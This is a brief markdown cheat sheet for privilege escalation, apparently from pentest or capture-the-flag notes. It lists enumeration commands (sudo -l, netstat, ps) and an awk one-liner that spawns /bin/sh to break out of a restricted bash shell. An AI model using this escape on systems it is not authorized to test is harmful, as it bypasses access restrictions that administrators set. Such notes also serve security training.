# PrivEsc

### Checklist

* Checking sudo : ```sudo -l```
* Checking netstat : ```netstat -laputen```
* Checking process : ```ps -elf```
### Escaping rbash

```awk 'BEGIN {system("/bin/sh")}'```
